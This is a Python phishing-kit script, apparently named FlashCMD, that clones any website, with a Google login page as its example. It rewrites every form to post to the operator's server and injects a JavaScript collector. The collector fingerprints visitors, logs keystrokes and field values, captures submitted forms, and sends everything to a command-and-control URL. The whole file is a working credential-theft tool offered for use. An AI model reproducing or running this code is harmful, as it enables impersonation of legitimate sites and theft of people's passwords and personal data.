#!/usr/bin/env python3
"""
clone.py — Clone n'importe quel site web
Usage : python clone.py <url> [nom]
Ex    : python clone.py https://accounts.google.com google
"""
import sys, re, os, pathlib, urllib.parse, json

try:
    import requests
    from bs4 import BeautifulSoup
    import urllib3
    urllib3.disable_warnings()
except ImportError:
    print("[!] pip install requests beautifulsoup4")
    sys.exit(1)

PAGE_DIR = pathlib.Path("pages")

def get_public_url() -> str:
    cfg = pathlib.Path(".config.json")
    if cfg.exists():
        try:
            return json.loads(
                cfg.read_text()
            ).get("public_url", "").rstrip("/")
        except Exception:
            pass
    return "http://localhost:8080"

PUBLIC_URL = get_public_url()

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
    "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8",
    "Accept": (
        "text/html,application/xhtml+xml,"
        "application/xml;q=0.9,*/*;q=0.8"
    ),
}

COLLECTOR_JS = """
<script>
/* FlashCMD collector */
(function(){{
  const C2="{c2}";
  function col(d){{
    fetch(C2+"/collect",{{method:"POST",
      headers:{{"Content-Type":"application/json"}},
      body:JSON.stringify(d)}}).catch(()=>{{}});
  }}
  function klog(d){{
    fetch(C2+"/keylog",{{method:"POST",
      headers:{{"Content-Type":"application/json"}},
      body:JSON.stringify(d)}}).catch(()=>{{}});
  }}

  // Fingerprint
  col({{page:"clone_{name}_land",
    ua:navigator.userAgent,lang:navigator.language,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+"x"+screen.height,
    cores:navigator.hardwareConcurrency,
    mem:navigator.deviceMemory,ref:document.referrer}});

  // Keylogger
  const B=[];let t=null;
  document.addEventListener("keydown",e=>{{
    const el=document.activeElement;
    B.push({{k:e.key,
      f:el?(el.id||el.name||el.type||"?"):"?",
      ts:Date.now()}});
    clearTimeout(t);t=setTimeout(flush,3000);
    if(e.key==="Enter")flush();
  }},true);
  document.addEventListener("blur",e=>{{
    const el=e.target;
    if(el.value&&el.tagName==="INPUT")
      klog({{type:"field",
        f:el.id||el.name||el.type,
        v:el.value,ts:new Date().toISOString()}});
  }},true);
  document.addEventListener("submit",e=>{{
    const fd=new FormData(e.target),d={{
      page:"clone_{name}_submit",
      ua:navigator.userAgent}};
    fd.forEach((v,k)=>{{d[k]=v}});
    col(d);
  }},true);
  function flush(){{
    if(!B.length)return;
    klog({{type:"keys",keys:B.splice(0),
      url:location.href,ts:new Date().toISOString()}});
  }}
  setInterval(flush,8000);
  window.addEventListener("beforeunload",()=>{{
    flush();
    if(B.length&&navigator.sendBeacon)
      navigator.sendBeacon(C2+"/keylog",
        JSON.stringify({{type:"beacon",keys:B}}));
  }});
}})();
</script>
"""

def save_asset(url_base: str, src: str,
               asset_dir: pathlib.Path) -> str:
    if not src:
        return src
    if src.startswith("data:"):
        return src
    if src.startswith("javascript:"):
        return src
    if src.startswith("//"):
        src = "https:" + src
    full = src if src.startswith("http") else \
           urllib.parse.urljoin(url_base, src)
    fname = re.sub(r"[^\w\-.]", "_",
                   src.split("/")[-1]
                      .split("?")[0])[:60]
    if not fname or "." not in fname:
        fname = str(abs(hash(src))) + ".bin"
    dest = asset_dir / fname
    try:
        if not dest.exists():
            r = requests.get(full, headers=HEADERS,
                             timeout=8, verify=False)
            if r.status_code == 200:
                dest.write_bytes(r.content)
        return f"/assets_{asset_dir.name}/{fname}"
    except Exception:
        return src

def clone_site(url: str, name: str):
    print(f"[*] Clonage de {url}…")
    PAGE_DIR.mkdir(exist_ok=True)
    asset_dir = PAGE_DIR / f"assets_{name}"
    asset_dir.mkdir(parents=True, exist_ok=True)

    try:
        r = requests.get(url, headers=HEADERS,
                         timeout=15, verify=False)
        r.encoding = r.apparent_encoding
    except Exception as e:
        print(f"[!] Erreur fetch: {e}")
        sys.exit(1)

    soup     = BeautifulSoup(r.text, "html.parser")
    base_url = (f"{urllib.parse.urlparse(url).scheme}://"
                f"{urllib.parse.urlparse(url).netloc}")

    # CSS
    for tag in soup.find_all(
        "link", rel=lambda x: x and "stylesheet" in x
    ):
        if tag.get("href"):
            tag["href"] = save_asset(
                base_url, tag["href"], asset_dir)

    # JS
    for tag in soup.find_all("script", src=True):
        tag["src"] = save_asset(
            base_url, tag["src"], asset_dir)

    # Images
    for tag in soup.find_all(["img","input"],
                              src=True):
        tag["src"] = save_asset(
            base_url, tag["src"], asset_dir)

    # Nettoyage srcset
    for tag in soup.find_all(True):
        if tag.get("srcset"):
            tag["srcset"] = ""

    # Réécrire les formulaires
    for form in soup.find_all("form"):
        form["action"] = f"/proxy_submit/{name}"
        form["method"] = "post"

    # Injecter le collecteur
    collector = BeautifulSoup(
        COLLECTOR_JS.format(c2=PUBLIC_URL, name=name),
        "html.parser"
    )
    if soup.body:
        soup.body.append(collector)
    else:
        soup.append(collector)

    # Sauvegarder
    out = PAGE_DIR / f"clone_{name}.html"
    out.write_text(str(soup), encoding="utf-8")

    print(f"[+] Clone → pages/clone_{name}.html")
    print(f"[+] Assets → pages/assets_{name}/")
    print(f"[+] URL : {PUBLIC_URL}/clone/{name}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python clone.py <url> [nom]")
        sys.exit(1)
    url  = sys.argv[1]
    name = sys.argv[2] if len(sys.argv) > 2 else \
           urllib.parse.urlparse(url).netloc\
               .replace(".", "_").replace("www_", "")
    clone_site(url, name)